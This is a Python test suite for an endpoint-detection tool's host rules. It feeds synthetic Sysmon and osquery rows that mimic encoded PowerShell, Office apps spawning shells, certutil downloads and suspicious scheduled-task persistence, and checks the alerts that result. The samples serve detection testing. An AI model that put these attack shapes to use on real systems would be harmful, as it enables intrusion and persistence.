"""Endpoint rules (R17-R21): host cases from the agent's own rows, on synthetic osquery/Sysmon rows only."""

import json
from datetime import datetime, timezone

from conftest import T0, conn, dns

from tapwatch import config, detectors, zeek
from tapwatch.hostrules import (
    DUMP_MIN,
    NAMES,
    AppSpawnsShell,
    BadSignatureConnects,
    BrowserExtension,
    DestructiveCommand,
    DiscoveryBurst,
    EncodedCommand,
    EndpointState,
    FileChanged,
    FilesStaged,
    FleetAgents,
    LinuxCommand,
    LinuxSuspiciousConnect,
    LolbinConnects,
    LsassAccess,
    NewPersistence,
    RemoteAccessTool,
    TempFolderConnects,
    TunnelOpened,
    _entry_key,
    build,
    folder_class,
)
from tapwatch.models import Route
from tapwatch.pipeline import Pipeline
from tapwatch.router import CODE_ONLY, critical, route, wants_ai
from tapwatch.store import Store
from tapwatch.summarizer import Assets, summarize

PC = "192.168.50.10"
DST = "203.0.113.50"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"
WORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
OUTLOOK = r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
EXPLORER = r"C:\Windows\explorer.exe"
TEMP_EXE = r"C:\Users\<user>\AppData\Local\Temp\7zS1\setup.exe"
PUBLIC_EXE = r"C:\Users\Public\svc.exe"
DOWNLOADS_EXE = r"C:\Users\<user>\Downloads\tool.exe"


def utc(t):
    return datetime.fromtimestamp(t, timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


def sysmon(eid, t, guid="{g1}", **cols):
    """One Sysmon row as the agent's `sysmon_events` query logs it, read 40 s later (the query interval)."""
    return {"_type": "osquery", "name": "sysmon_events", "unixTime": int(t) + 40, "ts": int(t) + 40,
            "action": "added", "columns": {"eventid": str(eid), "utc": utc(t), "guid": guid, **cols}}


def start(t, path, parent, guid="{g1}", **flags):
    return sysmon(1, t, guid, path=path, parent_path=parent, **flags)


def connect(t, path, guid="{g1}", remote=DST, port=443):
    return sysmon(3, t, guid, path=path, remote_address=remote, remote_port=str(port))


def snapshot_conn(t, name, path, signature, signer="", remote=DST, port=443, action="added"):
    return {"_type": "osquery", "name": "outbound_connections", "unixTime": int(t), "ts": int(t), "action": action,
            "columns": {"name": name, "path": path, "pid": "4242", "remote_address": remote, "remote_port": str(port),
                        "signature": signature, "signer": signer, "parent_name": "explorer.exe"}}


def sigs(t, *rows):
    """A process_signatures snapshot: (path, signature, signer) per program that holds a socket."""
    return {"_type": "osquery", "name": "process_signatures", "action": "snapshot", "unixTime": int(t), "ts": int(t),
            "snapshot": [{"path": p, "signature": sig, "signer": signer} for p, sig, signer in rows]}


def addrs(t, *ips):
    return {"_type": "osquery", "name": "host_addresses", "action": "snapshot", "unixTime": int(t), "ts": int(t),
            "snapshot": [{"address": a} for a in ips]}


def run(det, *recs):
    out = []
    for r in recs:
        out += det.feed(r)
    return out


def st():
    return EndpointState(PC)


def no_paths(case):
    """A case carries program names (as indicators) and folder classes, never a path or a command line."""
    text = json.dumps(case.facts) + json.dumps(case.indicators)
    assert "C:\\\\" not in text and "<user>" not in text and "cmdline" not in text, text
    assert "/" not in case.facts.get("entry", "")   # an entry name is never a file path
    assert case.indicators and case.host == PC and case.facts["source"] == "endpoint"


# ------------------------------------------------------------ R17 encoded or download-and-run command

def test_encoded_download_from_a_document_app_is_must_alert():
    (c,) = run(EncodedCommand(st()), start(T0, PS, WORD, cmd_enc="1", cmd_dl="1", cmd_url="1"))
    assert c.must_alert and c.base_severity == 5 and c.detector == "host_encoded_cmd"
    assert c.facts["signals"] == ["an encoded payload", "a download-and-run"] and c.facts["parent_class"] == "document"
    assert c.facts["program"] == "powershell.exe" and c.facts["folder"] == "installed" and c.ts == T0
    assert c.indicators == ["powershell.exe"] and c.indicator == "powershell.exe"
    no_paths(c)


def test_a_replayed_event_raises_no_second_case_even_after_an_address_change_and_a_restart():
    """#303: after alerter restarts, the morning's encoded-PowerShell starts were alerted again, under the PC's
    other addresses. The same event row read twice is one event, whatever address the PC has by then."""
    from tapwatch.detectors import decode, encode
    det = EncodedCommand(st())
    line = start(T0, PS, EXPLORER, guid="{g7}", cmd_enc="1")
    (first,) = run(det, line)
    assert first.host == PC
    assert run(det, addrs(T0 + 3600, "192.168.50.11"), line) == []          # new address, same event: nothing
    later = EncodedCommand(EndpointState(PC))                                  # a restart: state saved and restored
    later.restore(decode(encode(det.snapshot())))
    assert run(later, line) == []
    (again,) = run(later, start(T0 + 7200, PS, EXPLORER, guid="{g8}", cmd_enc="1"))   # a real new start still alerts
    assert again.ts == T0 + 7200


def test_one_strong_signal_alerts_and_hidden_window_makes_it_must_alert():
    (enc,) = run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_enc="1"))
    assert (enc.base_severity, enc.must_alert) == (4, False)
    (hidden,) = run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_dl="1", cmd_hidden="1"))
    assert (hidden.base_severity, hidden.must_alert) == (5, True) and hidden.facts["unusual"] == ["a hidden window"]
    (enc2,) = run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_enc="1", cmd_b64="1"))
    assert enc2.must_alert


def test_chocolateys_install_line_alerts_but_is_suppressible():
    """dl + iex + an execution-policy bypass is Chocolatey's documented install command: a benign reading
    exists, and must_alert can't be suppressed, so it stays at severity 4 (review of PR #87)."""
    (choco,) = run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_dl="1", cmd_iex="1", cmd_bypass="1", cmd_url="1"))
    assert (choco.base_severity, choco.must_alert) == (4, False) and choco.facts["unusual"] == ["an execution-policy bypass"]


def test_a_weak_signal_alone_raises_nothing_unless_a_browser_started_it():
    """`iex (irm ...)` installs dev tools; base64 decoding is in ordinary scripts. From a browser it isn't."""
    assert run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_iex="1"), start(T0, CMD, EXPLORER, cmd_b64="1")) == []
    (c,) = run(EncodedCommand(st()), start(T0, PS, CHROME, cmd_iex="1"))
    assert (c.base_severity, c.must_alert, c.facts["parent_class"]) == (4, False, "browser")
    (both,) = run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_iex="1", cmd_b64="1"))
    assert (both.base_severity, both.must_alert) == (4, False)                              # two weak ones together: an alert


def test_signals_on_programs_that_are_not_shells_are_ignored():
    """Measured: the only encoded-payload signal in 34.5 h was msiexec passing a long argument to itself."""
    msi = r"C:\Windows\System32\msiexec.exe"
    assert run(EncodedCommand(st()), start(T0, msi, msi, cmd_enc="1")) == []
    assert run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_url="1")) == []           # a URL alone is no signal
    assert run(EncodedCommand(st()), start(T0, PS, EXPLORER, cmd_hidden="1", cmd_bypass="1")) == []  # installers do this


# ------------------------------------------------------------ R18 document app or browser starts a shell

def test_document_app_starting_powershell_alerts():
    (c,) = run(AppSpawnsShell(st()), start(T0, PS, WORD))
    assert c.base_severity == 4 and not c.must_alert and c.facts["parent_class"] == "document"
    assert "document" in c.title and c.facts["parent"] == "WINWORD.EXE"
    assert c.indicators == ["WINWORD.EXE > powershell.exe"]                                # what a suppression keys on
    no_paths(c)


def test_browser_starting_cmd_alone_raises_nothing():
    """Measured: Chrome started cmd.exe 37 times in 34.5 h (native-messaging hosts), none with a URL, none connected."""
    d = AppSpawnsShell(st())
    assert run(d, start(T0, CMD, CHROME), start(T0 + 60, CMD, CHROME, guid="{g2}", cmd_url="1"),
               start(T0 + 60, PS, CHROME, guid="{g3}", cmd_dl="1")) == []
    assert run(EncodedCommand(st()), start(T0, PS, CHROME, cmd_dl="1"))[0].base_severity == 4   # R17 has that one


def test_browser_child_that_connects_to_the_internet_alerts_once():
    d = AppSpawnsShell(st())
    assert run(d, start(T0, CMD, CHROME)) == []
    assert run(d, connect(T0 + 2, CMD, remote="192.168.50.1")) == []                       # the LAN doesn't count
    (c,) = run(d, connect(T0 + 5, CMD))
    assert c.base_severity == 4 and c.facts["connected"] and c.facts["port"] == 443 and "connected" in c.title
    assert c.indicators == ["chrome.exe > cmd.exe"]
    assert run(d, connect(T0 + 6, CMD, port=8443)) == []                                   # one case per process
    no_paths(c)
    late = AppSpawnsShell(st())
    run(late, start(T0, CMD, CHROME))
    assert run(late, connect(T0 + 700, CMD)) == []                                         # outside the 10-minute join


def test_document_child_is_not_reported_twice_and_other_parents_are_ignored():
    d = AppSpawnsShell(st())
    assert len(run(d, start(T0, PS, WORD), connect(T0 + 1, PS))) == 1
    wsl = r"C:\Windows\System32\wslhost.exe"
    assert run(AppSpawnsShell(st()), start(T0, CMD, wsl), start(T0, PS, EXPLORER, guid="{g2}"),
               start(T0, PS, CMD, guid="{g3}")) == []


# ------------------------------------------------------------ R19 program in a temp folder connects out

def test_temp_and_downloads_programs_connecting_out_are_digest_items():
    (c,) = run(TempFolderConnects(st()), connect(T0, TEMP_EXE))
    assert c.base_severity == 3 and c.facts == {"source": "endpoint", "program": "setup.exe", "folder": "temp", "port": 443}
    assert c.indicators == ["setup.exe"]
    no_paths(c)
    (dl,) = run(TempFolderConnects(st()), connect(T0, DOWNLOADS_EXE))
    assert dl.base_severity == 3 and dl.facts["folder"] == "downloads"
    d = TempFolderConnects(st())
    run(d, connect(T0, TEMP_EXE))
    assert run(d, connect(T0 + 60, TEMP_EXE, guid="{g2}", port=80)) == []                  # the installer keeps going


def test_shared_folders_and_dropper_shapes_alert():
    (pub,) = run(TempFolderConnects(st()), connect(T0, PUBLIC_EXE))
    assert pub.base_severity == 4 and pub.facts["folder"] == "shared"
    (dropped,) = run(TempFolderConnects(st()), start(T0, TEMP_EXE, OUTLOOK), connect(T0 + 3, TEMP_EXE))
    assert dropped.base_severity == 4 and dropped.facts["parent"] == "OUTLOOK.EXE" and dropped.facts["parent_class"] == "document"
    (scripted,) = run(TempFolderConnects(st()), start(T0, TEMP_EXE, EXPLORER, cmd_dl="1"), connect(T0 + 3, TEMP_EXE))
    assert scripted.base_severity == 4 and scripted.facts["signals"] == ["a download-and-run"]


def test_installed_programs_lan_and_dns_do_not_count():
    d = TempFolderConnects(st())
    assert run(d, connect(T0, CHROME), connect(T0, TEMP_EXE, remote="192.168.50.1"),
               connect(T0, TEMP_EXE, remote="203.0.113.1", port=53), connect(T0, TEMP_EXE, remote="not an ip")) == []


# ------------------------------------------------------------ R20 built-in tool connects out

def test_download_lolbins_are_must_alert_and_the_rest_alert():
    certutil = r"C:\Windows\System32\certutil.exe"
    (c,) = run(LolbinConnects(st()), connect(T0, certutil))
    assert c.must_alert and c.base_severity == 5 and c.facts["downloader"] and c.facts["program"] == "certutil.exe"
    no_paths(c)
    rundll = r"C:\Windows\System32\rundll32.exe"
    (r,) = run(LolbinConnects(st()), start(T0, rundll, WORD, cmd_url="1"), connect(T0 + 1, rundll))
    assert (r.base_severity, r.must_alert) == (4, False)
    assert r.facts["parent"] == "WINWORD.EXE" and r.facts["url"] and r.facts["parent_class"] == "document"


def test_msbuild_is_a_weekly_digest_item_not_an_hourly_alert():
    """MSBuild restores NuGet packages on any Visual Studio PC (review of PR #87)."""
    d = LolbinConnects(st())
    msbuild = r"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
    (c,) = run(d, connect(T0, msbuild))
    assert (c.base_severity, c.must_alert, c.facts["downloader"]) == (3, False, False)
    assert run(d, connect(T0 + 3600, msbuild, guid="{g2}")) == []
    assert len(run(d, connect(T0 + 8 * 86400, msbuild, guid="{g3}"))) == 1


def test_lolbins_on_the_lan_and_ordinary_programs_are_ignored():
    rundll = r"C:\Windows\System32\rundll32.exe"
    assert run(LolbinConnects(st()), connect(T0, rundll, remote="192.168.50.2"), connect(T0, rundll, port=53),
               connect(T0, CHROME), connect(T0, PS)) == []


# ------------------------------------------------------------ R21 bad code signature connects out

def test_untrusted_and_distrusted_signatures_alert_missing_is_ignored():
    """osquery's authenticode says trusted, missing, untrusted or distrusted; a tampered file is `untrusted`."""
    app = r"C:\Program Files\App\app.exe"
    (bad,) = run(BadSignatureConnects(st()), snapshot_conn(T0, "app.exe", app, "untrusted", "App Maker"))
    assert (bad.base_severity, bad.must_alert) == (4, False) and bad.facts["signature"] == "untrusted"
    assert bad.facts["signer"] == "App Maker" and bad.facts["folder"] == "installed" and bad.facts["parent"] == "explorer.exe"
    no_paths(bad)
    (blocked,) = run(BadSignatureConnects(st()), snapshot_conn(T0, "x.exe", app, "Distrusted"))
    assert blocked.base_severity == 4
    # measured: every "missing" or unreadable signature in 34.5 h was an installed app osquery couldn't read
    assert run(BadSignatureConnects(st()), snapshot_conn(T0, "a.exe", app, "missing"), snapshot_conn(T0, "b.exe", app, ""),
               snapshot_conn(T0, "c.exe", app, "trusted"), snapshot_conn(T0, "d.exe", app, "untrusted", action="removed"),
               snapshot_conn(T0, "e.exe", app, "untrusted", remote="192.168.50.9")) == []


def test_signature_and_connection_join_by_path_whichever_comes_first():
    """2026-10-17: the signature moved out of the socket query (15 s per socket, watchdog-killed, denylisted 24 h)
    into a 5-minute per-path snapshot, so either row can arrive first."""
    app = r"C:\Users\<user>\AppData\Local\Temp\tapwatch-sig-test.exe"
    # signature known, then the connection: fires on the connection row
    (a,) = run(BadSignatureConnects(st()), sigs(T0, (app, "untrusted", "")),
               snapshot_conn(T0 + 30, "tapwatch-sig-test.exe", app, ""))
    assert a.base_severity == 4 and a.facts["signature"] == "untrusted" and a.facts["folder"] == "temp"
    assert a.facts["port"] == 443 and a.facts["parent"] == "explorer.exe"
    # connection first, then the signature within the window: fires on the signature row, with the socket's facts
    (b,) = run(BadSignatureConnects(st()), snapshot_conn(T0, "tapwatch-sig-test.exe", app, ""),
               sigs(T0 + 240, (app, "Untrusted", "Self")))
    assert b.facts["signer"] == "Self" and b.facts["port"] == 443 and b.indicators == ["tapwatch-sig-test.exe"]
    # the window is 600 s inclusive; a signature for a program that last connected before that, or never, or to the
    # LAN, or whose connection row was a `removed` one: nothing
    assert len(run(BadSignatureConnects(st()), snapshot_conn(T0, "x.exe", app, ""), sigs(T0 + 600, (app, "untrusted", "")))) == 1
    assert run(BadSignatureConnects(st()), snapshot_conn(T0, "x.exe", app, ""), sigs(T0 + 601, (app, "untrusted", ""))) == []
    assert run(BadSignatureConnects(st()), snapshot_conn(T0, "x.exe", app, "", action="removed"),
               sigs(T0 + 60, (app, "untrusted", ""))) == []
    assert run(BadSignatureConnects(st()), sigs(T0, (app, "untrusted", ""))) == []
    assert run(BadSignatureConnects(st()), snapshot_conn(T0, "x.exe", app, "", remote="192.168.50.9"),
               sigs(T0 + 60, (app, "untrusted", ""))) == []
    # trusted or unreadable signatures, either order, and a connection with no signature known at all: nothing
    assert run(BadSignatureConnects(st()), sigs(T0, (app, "trusted", "App Maker"), (r"C:\x\y.exe", "missing", "")),
               snapshot_conn(T0 + 30, "a.exe", app, ""), snapshot_conn(T0 + 30, "y.exe", r"C:\x\y.exe", ""),
               snapshot_conn(T0 + 30, "z.exe", r"C:\x\z.exe", "")) == []
    # the path join is case-insensitive (Windows), and the maps stay bounded
    (cased,) = run(BadSignatureConnects(st()), sigs(T0, (app.upper(), "untrusted", "")), snapshot_conn(T0 + 1, "t.exe", app, ""))
    assert cased.facts["signature"] == "untrusted"
    s = st()
    s.update_signatures([{"path": f"C:\\p\\{i}.exe", "signature": "trusted"} for i in range(700)])
    assert len(s.signatures) == 500 and s.signature_of(r"C:\p\699.exe") == ("trusted", "")
    for i in range(700):
        s.remember_connection({"path": f"C:\\q\\{i}.exe", "remote_address": DST, "remote_port": "443"}, T0 + i)
    assert len(s.connected) <= 601 and s.connection_of(r"C:\q\699.exe", T0 + 699) is not None


# ------------------------------------------------------------ the framework

def test_pc_address_follows_the_agents_snapshots_and_prefers_the_lan():
    s = EndpointState("")
    d = EncodedCommand(s)
    assert s.host == "this PC"                                                              # never an empty host
    d.feed(addrs(T0, "172.28.0.1", "192.168.50.77", "fe80::1", "100.64.0.5"))
    assert s.host == "192.168.50.77"
    d.feed(addrs(T0 + 300, "172.28.0.1", "10.0.0.5"))
    assert s.host == "10.0.0.5"
    configured = EndpointState(PC)
    EncodedCommand(configured).feed(addrs(T0, "192.168.50.77", PC))
    assert configured.host == PC                                                            # the configured one wins
    (c,) = run(EncodedCommand(s), start(T0, PS, WORD, cmd_enc="1", cmd_dl="1"))
    assert c.host == "10.0.0.5"
    # the router's network decides between two LAN-looking addresses: WSL in mirrored mode also lists
    # 10.255.255.254, which sorted ahead of the real address (measured 2026-10-17, #792-#794)
    routed = EndpointState("", gateways=["192.168.50.1"])
    EncodedCommand(routed).feed(addrs(T0, "10.255.255.254", "192.168.50.77", "172.17.0.1"))
    assert routed.host == "192.168.50.77"
    EncodedCommand(routed).feed(addrs(T0 + 300, "10.255.255.254", "172.17.0.1"))
    assert routed.host == "192.168.50.77"                                                   # a routed address, once seen, sticks
    fallback = EndpointState("", gateways=["192.168.50.1"])
    EncodedCommand(fallback).feed(addrs(T0, "10.0.0.5", "172.17.0.1"))
    assert fallback.host == "10.0.0.5"                                                      # never on the router's net: the old order


def test_wsl_nat_snapshot_never_moves_the_host_off_the_lan():
    """Two agents report for one PC: WSL in NAT mode lists only its 172.x address. Taking it at face value gave
    about half the cases the wrong host (review of PR #87), splitting dedupe keys and suppressions."""
    s = EndpointState("")
    d = EncodedCommand(s)
    d.feed(addrs(T0, "192.168.50.77", "172.28.0.1"))                                       # Windows agent
    d.feed(addrs(T0 + 10, "172.28.5.2"))                                                    # WSL agent, NAT mode
    assert s.host == "192.168.50.77"
    fresh = EndpointState("")
    EncodedCommand(fresh).feed(addrs(T0, "172.28.5.2"))
    assert fresh.host == "172.28.5.2"                                                       # better than "this PC"...
    EncodedCommand(fresh).feed(addrs(T0 + 10, "192.168.50.77", "172.28.0.1"))
    assert fresh.host == "192.168.50.77"                                                    # ...until the LAN address shows
    (c,) = run(EncodedCommand(EndpointState("")), start(T0, PS, WORD, cmd_enc="1", cmd_dl="1"))
    assert c.host == "this PC" and c.must_alert                                             # no address yet: still raised


def test_names_are_code_only_and_build_wires_them():
    assert set(NAMES) <= CODE_ONLY
    *dets, fleet = build({"host_context": {"host": PC}})
    assert [d.name for d in dets] == list(NAMES) and len({id(d.state) for d in dets}) == 1
    assert isinstance(fleet, FleetAgents)                    # last: the computers enrolled in Fleet, each with these rules
    assert dets[0].state.host == PC
    for d in dets:
        assert d.feed(conn(T0)) == [] and d.feed(dns(T0, "a.example")) == []               # Zeek records: not ours
    assert build({"detectors": {"host_rules": {"enabled": False}}}) == []
    tuned = build({"detectors": {"host_app_shell": {"reported_days": 1}}})
    assert next(d for d in tuned if d.name == "host_app_shell").ttl == 86400.0


def test_network_detectors_ignore_endpoint_records():
    for d in detectors.build({}):
        assert d.feed(start(T0, PS, WORD, cmd_enc="1")) == [] and d.feed(addrs(T0, PC)) == []


def test_reported_state_persists_and_restores():
    d = TempFolderConnects(st())
    assert len(run(d, connect(T0, TEMP_EXE))) == 1
    fresh = TempFolderConnects(st())
    fresh.restore(d.snapshot())
    assert run(fresh, connect(T0 + 60, TEMP_EXE, guid="{g2}")) == []                        # still this week's item


def test_folder_classes_never_echo_the_path():
    assert folder_class(TEMP_EXE) == "temp" and folder_class(PUBLIC_EXE) == "shared"
    assert folder_class(r"C:\Users\<user>\AppData\Local\Programs\App\App.exe") == "appdata"
    assert folder_class(r"D:\Games\game.exe") == "other" and folder_class("") == "unknown"
    assert folder_class(r"C:\Windows\System32\cmd.exe") == "installed"


# ------------------------------------------------------------ routing and summaries

def test_routing_code_only_floors_and_learning_period():
    (lol,) = run(LolbinConnects(st()), connect(T0, r"C:\Windows\System32\rundll32.exe"))
    assert not wants_ai(lol)
    r, _ = route(lol, None)
    assert r is Route.ALERT and critical(lol, None, r)
    assert route(lol, None, learning="learning period (day 1 of 3)")[0] is Route.DIGEST    # like every code-only alert
    (must,) = run(LolbinConnects(st()), connect(T0, r"C:\Windows\System32\certutil.exe"))
    assert route(must, None, suppression="host_lolbin + this device", learning="learning period (day 1 of 3)") == \
        (Route.ALERT, "always-alert rule")
    (digest,) = run(TempFolderConnects(st()), connect(T0, TEMP_EXE))
    assert route(digest, None)[0] is Route.DIGEST and not critical(digest, None, Route.DIGEST)


def test_summaries_quote_programs_and_never_state_paths_or_command_lines():
    cases = run(EncodedCommand(st()), start(T0, PS, WORD, cmd_enc="1", cmd_dl="1", cmd_hidden="1"))
    cases += run(AppSpawnsShell(st()), start(T0, PS, WORD))
    cases += run(AppSpawnsShell(st()), start(T0, CMD, CHROME), connect(T0 + 1, CMD))
    cases += run(TempFolderConnects(st()), start(T0, TEMP_EXE, OUTLOOK, cmd_dl="1"), connect(T0 + 1, TEMP_EXE))
    cases += run(LolbinConnects(st()), connect(T0, r"C:\Windows\System32\certutil.exe"))
    cases += run(BadSignatureConnects(st()), snapshot_conn(T0, "app.exe", r"C:\Program Files\App\app.exe", "untrusted",
                                                           'Evil "Corp'))
    assert len(cases) == 6
    texts = [summarize(c, Assets()) for c in cases]
    for text in texts:
        assert "On the PC itself" in text and "C:\\" not in text and "<user>" not in text and "Program Files" not in text
        assert "Program names from the PC (untrusted data" in text and "copied from the network" not in text
    assert '"powershell.exe"' in texts[0] and "an encoded payload and a download-and-run" in texts[0]
    assert "a hidden window" in texts[0] and '"WINWORD.EXE", a document or mail app' in texts[0]
    assert '"WINWORD.EXE", a document or mail app, started "powershell.exe"' in texts[1]
    assert "connected to the internet on port 443" in texts[2] and "helper program" in texts[2]
    assert "a temporary folder" in texts[3] and '"OUTLOOK.EXE"' in texts[3] and "a download-and-run" in texts[3]
    assert '"certutil.exe"' in texts[4] and "download or run remote content" in texts[4]
    assert 'Evil \\"Corp' in texts[5] and "changed after it was signed" in texts[5]


# ------------------------------------------------------------ the osquery log as a log source

def test_osquery_logs_are_read_like_zeeks(tmp_path):
    rows = [json.dumps({"name": "sysmon_events", "unixTime": int(T0) + 2, "action": "added", "columns": {"eventid": "3"}}),
            "not json", json.dumps({"name": "host_addresses", "unixTime": int(T0) + 4, "action": "snapshot",
                                    "snapshot": [{"address": PC}]})]
    (tmp_path / "osqueryd.results.log").write_text("\n".join(rows[:2]) + "\n")
    (tmp_path / "osqueryd.snapshots.log").write_text(rows[2] + "\n")
    (tmp_path / "conn.log").write_text(json.dumps({"ts": T0 + 3}) + "\n")
    got = [(r["_type"], r["ts"]) for r in zeek.replay(tmp_path)]
    assert got == [("osquery", T0 + 2), ("conn", T0 + 3), ("osquery", T0 + 4)]
    f = zeek.Follower(tmp_path)
    assert f.poll() == []                                                                   # history is skipped
    with (tmp_path / "osqueryd.results.log").open("a") as fh:
        fh.write(json.dumps({"name": "sysmon_events", "unixTime": int(T0) + 9, "action": "added", "columns": {}}) + "\n")
    (rec,) = f.poll()
    assert rec["_type"] == "osquery" and rec["ts"] == T0 + 9 and rec["name"] == "sysmon_events"
    f.close()


def test_host_log_dirs_are_only_those_with_an_agents_log(tmp_path):
    present = tmp_path / "osquery" / "log" / "osqueryd.results.log"
    present.parent.mkdir(parents=True)
    present.write_text("")
    cfg = {"host_context": {"results_logs": [str(present), str(tmp_path / "missing" / "osqueryd.results.log")]}}
    assert config.host_log_dirs(cfg) == [str(present.parent)]
    assert config.host_log_dirs({"host_context": {"results_logs": [str(tmp_path / "nope.log")]}}) == []


def test_pipeline_routes_host_cases_by_code_without_jev_or_host_context(tmp_path):
    from conftest import FakeJev, write_logs

    from tapwatch.hostctx import HostContext

    class Note:
        def __init__(self):
            self.sent = []

        def send(self, title, items):
            self.sent.append((title, items))
            return ["fake"]

    jev, note = FakeJev(), Note()
    zeek_dir = write_logs(tmp_path, conn=[conn(T0, src=PC)])
    hc = HostContext(PC, None, [], str(tmp_path / "t"))                                     # would apply: it's this PC
    p = Pipeline(build({"host_context": {"host": PC}}), Assets(), Store(":memory:"), client=jev, notifier=note,
                 hostctx=hc, zeek_dirs=[str(zeek_dir)])
    (cid, c, verdict, r), = p.process(connect(T0, r"C:\Windows\System32\certutil.exe"))
    assert r is Route.ALERT and verdict is None and jev.states == []                        # code decided; no tokens
    assert "host_who" not in c.facts                                                        # host context stays out
    assert note.sent and "certutil.exe" in json.dumps(note.sent) and "C:\\\\" not in json.dumps(note.sent)
    row = p.store.get(cid)
    assert row["reason"] == "always-alert rule" and "On the PC itself" in row["state"]
    assert p.process(connect(T0 + 60, r"C:\Windows\System32\certutil.exe", guid="{g2}")) == []   # counted, not re-sent
    assert p.store.get(cid)["hits"] == 2


# ------------------------------------------------------------ R23 new persistence entry

def persist(t, query, change="added", **cols):
    """One differential row of a persistence query, logged when the hourly query ran at `t`."""
    return {"_type": "osquery", "name": query, "unixTime": int(t), "ts": int(t), "action": change, "columns": cols}


def task(t, name, action, change="added"):
    return persist(t, "scheduled_tasks", change, name=name, action=action, path="\\" + name, enabled="1",
                   last_run_time=str(int(t)))


def tick(t):
    return {"_type": "tick", "ts": t}


def settle(det, *recs, at=None):
    """Feed the rows, then a tick two minutes later so the batch is read."""
    last = max(float(r.get("ts") or 0) for r in recs)
    return run(det, *recs, tick((at or last) + 130))


def test_new_task_running_a_script_from_downloads_alerts_and_carries_no_path():
    (c,) = settle(NewPersistence(st()), task(T0, "Updater", r'powershell.exe -File C:\Users\<user>\Downloads\up.ps1'))
    assert c.base_severity == 4 and c.detector == "host_persist" and c.indicators == ["powershell.exe"]
    assert c.facts["kind"] == "scheduled task" and c.facts["entry"] == "Updater" and c.facts["folder"] == "downloads"
    assert c.facts["script"] and c.facts["shell"] and c.facts["signals"] == []
    no_paths(c)
    (enc,) = settle(NewPersistence(st()), task(T0, "Sync", "powershell.exe -enc " + "Q" * 40))
    assert enc.base_severity == 4 and enc.facts["signals"] == ["an encoded or download-and-run command"]


def test_scripts_shells_and_user_folders_are_digest_items_once_a_week():
    # the measured day's shapes: the owner's .vbs in the Startup folder, OneDrive's RunOnce that runs cmd.exe
    det = NewPersistence(st())
    vbs = persist(T0, "startup_items", name="keep-wsl.vbs", path=r"C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keep-wsl.vbs",
                  args="", source=r"C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup", status="enabled", username="u")
    once = persist(T0, "startup_items", name="Delete Cached Update Binary", path=r"C:\WINDOWS\system32\cmd.exe",
                   args="/q /c del /q cache.exe", source=r"HKEY_USERS\S-1-5-21-1-2-3-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                   status="enabled", username="u")
    a, b = settle(det, vbs, once)
    assert (a.base_severity, a.facts["kind"], a.facts["script"], a.facts["registry"]) == (3, "startup item", True, False)
    assert (b.base_severity, b.facts["shell"], b.facts["registry"], b.indicators) == (3, True, True, ["cmd.exe"])
    for c in (a, b):
        no_paths(c)
    # the same entry re-created by the next update (a new GUID, a new version in the name) is the same digest line
    again = dict(once, unixTime=int(T0) + 7200, ts=int(T0) + 7200)
    again["columns"] = dict(once["columns"], name="Delete Cached Update Binary 26.183.0920.0005")
    assert settle(det, again) == []
    assert _entry_key("msedge_cleanup_{C50565E9-CCCF-44B4-BA15-5AC5C6569197}") == "msedge_cleanup"
    assert _entry_key("cbdhsvc_e46a2") == "cbdhsvc" and _entry_key("OneDrive Startup Task-S-1-5-21-867515037-1001") == "onedrive startup task"


def test_installed_programs_changes_inventories_and_warmup_raise_nothing():
    det = NewPersistence(st())
    # Windows' own: usoclient under %systemroot%, a per-user svchost service, a task with no action
    quiet = [task(T0, "Schedule Work", r" %systemroot%\system32\usoclient.exe StartWork"),
             persist(T0, "auto_start_services", name="cbdhsvc_7a142", display_name="Clipboard User Service",
                     path=r"C:\WINDOWS\system32\svchost.exe -k ClipboardSvcGroup -p", module_path="", user_account="LocalSystem"),
             task(T0, "SoftLandingDeferralTask-{e35fd6a0-ee4d-41d0-ac6e-69f3f6b9d159}", "")]
    assert settle(det, *quiet) == []
    # a task that ran: removed + added in one run because last_run_time changed, even for a script
    ran = [task(T0 + 3600, "Backup", r"wscript.exe C:\Users\<user>\backup.vbs", "removed"),
           task(T0 + 3600, "Backup", r"wscript.exe C:\Users\<user>\backup.vbs")]
    assert settle(det, *ran) == []
    # ... but the same script task appearing without a removed partner is new
    assert len(settle(det, task(T0 + 7200, "Backup2", r"wscript.exe C:\Users\<user>\backup2.vbs"))) == 1
    # an inventory: the first run after the agent's database was reset lists everything as added
    dump = [task(T0 + 10800, f"T{i}", rf"wscript.exe C:\Users\<user>\t{i}.vbs") for i in range(DUMP_MIN)]
    assert settle(det, *dump) == []
    # during warm-up everything is learned, and it stays learned after a restart
    from tapwatch.detectors import Warmup, decode, encode
    w = Warmup(600)
    learning = NewPersistence(st(), warmup=w)
    assert settle(learning, task(T0, "Learned", r"wscript.exe C:\Users\<user>\x.vbs")) == []
    saved = {k: decode(v) for k, v in json.loads(json.dumps(learning.snapshot())).items()}
    restarted = NewPersistence(st(), warmup=Warmup(0))
    restarted.restore(learning.snapshot())
    assert settle(restarted, task(T0 + 1000, "Learned", r"wscript.exe C:\Users\<user>\x.vbs")) == []   # known
    assert len(settle(restarted, task(T0 + 1000, "Fresh", r"wscript.exe C:\Users\<user>\y.vbs"))) == 1
    assert "known" in saved and encode(restarted.known)


def test_cron_and_launch_agents_use_posix_folders():
    cron = persist(T0, "crontab", event="", minute="*/5", hour="*", day_of_month="*", month="*", day_of_week="*",
                   command="/usr/bin/python3 /home/u/sync.py", path="/var/spool/cron/crontabs/u")
    (c,) = settle(NewPersistence(st()), cron)
    assert c.facts["kind"] == "cron job" and c.facts["script"] and c.facts["folder"] == "profile" and c.base_severity == 3
